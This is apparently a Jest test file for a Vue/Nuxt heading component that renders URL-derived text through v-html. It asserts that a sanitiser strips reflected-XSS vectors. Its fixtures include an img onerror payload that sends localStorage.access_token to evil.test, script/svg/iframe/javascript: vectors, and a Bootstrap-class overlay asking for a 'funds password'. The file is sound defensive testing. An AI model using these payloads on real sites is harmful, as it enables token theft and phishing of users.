/**
 * ListHeadingSection renders a page <h1> built from ROUTE INPUT, so its v-html must be
 * sanitised — and these tests MOUNT THE COMPONENT to prove it.
 *
 * WHY: six pages feed this component data taken straight from the URL —
 *   pages/search.vue                     ← $route.query.q
 *   pages/activity/_username/index.vue   ← $route.params.username
 *   pages/_username/comments/index.vue   ← $route.params.username
 *   pages/_username/blog/index.vue       ← $route.params.username
 *   pages/_username/videos/index.vue     ← $route.params.username
 *   pages/_username/wallet.vue           ← $route.params.username
 * and no page in this repo declares a validate(), so route params are unconstrained.
 * Unescaped that is a REFLECTED XSS: one crafted link, no login, no chain write.
 *
 * WHY MOUNTED, NOT HELPER-TESTED: the first version of this file imported
 * @/plugins/sanitize and asserted on $sanitize directly, never touching the component.
 * Review proved by execution that reverting the component back to v-html="textualDisplay"
 * left it 9/9 green — the same worthless shape already removed from the translation spec.
 * Grading the rendered h1's DOM is what makes a revert go red.
 */
import { mount } from '@vue/test-utils'
import sanitizePlugin from '@/plugins/sanitize'
import ListHeadingSection from '@/components/ListHeadingSection.vue'

// Wire the REAL $sanitize in, exactly as Nuxt injects it.
let $sanitize
beforeAll(() => {
  process.client = true
  const injected = {}
  sanitizePlugin({ app: {} }, (name, fn) => { injected[name] = fn })
  $sanitize = injected.sanitize
})
afterAll(() => { delete process.client })

const renderHeading = (textualDisplay) => {
  const wrapper = mount(ListHeadingSection, {
    propsData: { textualDisplay },
    mocks: { $sanitize },
  })
  return wrapper.find('h1')
}

describe('ListHeadingSection neutralises route-derived markup', () => {
  // Delivered the way the attacker would: inside the heading string the page builds.
  const asHeading = (payload) => 'Search Results for "' + payload + '"'

  it.each([
    ['img onerror beacon', `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.access_token)">`],
    ['img onerror, no leading space', '<img/src="x"/onerror="alert(1)">'],
    ['script tag', '<script>alert(1)<\/script>'],
    ['svg onload', '<svg onload=alert(1)>'],
    ['iframe', '<iframe src="https://evil.test/"><\/iframe>'],
    ['javascript: anchor', '<a href="javascript:alert(1)">x</a>'],
    ['onmouseover span', '<span onmouseover="alert(1)">hover</span>'],
  ])('%s leaves no live attribute or element in the rendered h1', (_label, payload) => {
    const h1 = renderHeading(asHeading(payload))
    const el = h1.element

    // Graded by DOM, not by regex on a string: a regex for /\son[a-z]+=/ misses
    // <img/onerror=...> because there is no leading whitespace.
    el.querySelectorAll('*').forEach((node) => {
      Array.from(node.attributes).forEach((attr) => {
        expect(attr.name.toLowerCase().startsWith('on')).toBe(false)
      })
    })
    expect(el.querySelectorAll('script, iframe, svg, object, embed, style').length).toBe(0)
    expect(el.innerHTML).not.toMatch(/javascript:/i)
    expect(el.innerHTML).not.toContain('evil.test')
  })

  it('does not let an injected element carry a class that Bootstrap can position', () => {
    // The site loads Bootstrap globally, so an allowed class is an overlay primitive even
    // with every script vector blocked — and no CSP would stop it, because it is not script.
    const h1 = renderHeading(asHeading('<span class="fixed-top w-100 h-100 bg-white">Enter your funds password</span>'))

    const classed = h1.element.querySelectorAll('[class]')
    classed.forEach((node) => {
      node.getAttribute('class').split(/\s+/).filter(Boolean).forEach((cls) => {
        expect(['mr-2', 'token-logo-md', 'fas', 'fa-info-circle', 'text-white']).toContain(cls)
      })
    })
  })

  it.each([['div'], ['h1'], ['h2'], ['table'], ['p'], ['blockquote']])(
    'strips structural <%s>, which escapes the heading when the SSR response is document-parsed',
    (tag) => {
      const h1 = renderHeading(asHeading('<' + tag + '>injected</' + tag + '>'))
      expect(h1.element.querySelectorAll(tag).length).toBe(0)
      // The text is still shown — we strip the tag, not the content.
      expect(h1.text()).toContain('injected')
    })

  it('still renders the benign query text', () => {
    const h1 = renderHeading(asHeading('running shoes'))
    expect(h1.text()).toContain('Search Results for')
    expect(h1.text()).toContain('running shoes')
  })
})

describe('the five real callers keep the markup they pass', () => {
  // Lifted verbatim from the call sites. The previous version of this file invented
  // class='chain-logo' and href='/faq', neither of which exists in the codebase — which is
  // exactly why it stayed green while yieldfarming's info button was being stripped.
  const LOGO = 'Hive communities<img src="/img/HIVE.png" class="mr-2 token-logo-md" alt="">'
  const YIELD = 'Daily yield&nbsp;<a href="#" data-toggle="modal" data-target="#notifyModal"><i class="fas fa-info-circle text-white"></i></a>'

  it('keeps the chain logo (communities, explore, blog, videos)', () => {
    const h1 = renderHeading(LOGO)
    const img = h1.element.querySelector('img')
    expect(img).not.toBeNull()
    expect(img.getAttribute('src')).toBe('/img/HIVE.png')
    expect(img.getAttribute('class')).toBe('mr-2 token-logo-md')
  })

  it('keeps the yieldfarming info button, icon and modal trigger', () => {
    // This is the case that was broken server-side and that no test noticed.
    const h1 = renderHeading(YIELD)
    const a = h1.element.querySelector('a')
    const i = h1.element.querySelector('i')

    expect(a).not.toBeNull()
    expect(a.getAttribute('data-toggle')).toBe('modal')
    expect(a.getAttribute('data-target')).toBe('#notifyModal')
    expect(i).not.toBeNull()
    expect(i.getAttribute('class')).toBe('fas fa-info-circle text-white')
  })
})

describe('$sanitize input guard', () => {
  it('returns empty for a non-string instead of throwing', () => {
    // sanitize-html throws on a non-string, and on the server that is a 500 for the page.
    expect($sanitize(undefined)).toBe('')
    expect($sanitize(null)).toBe('')
    expect($sanitize({ toString: () => '<img src=x onerror=alert(1)>' })).toBe('')
  })
})
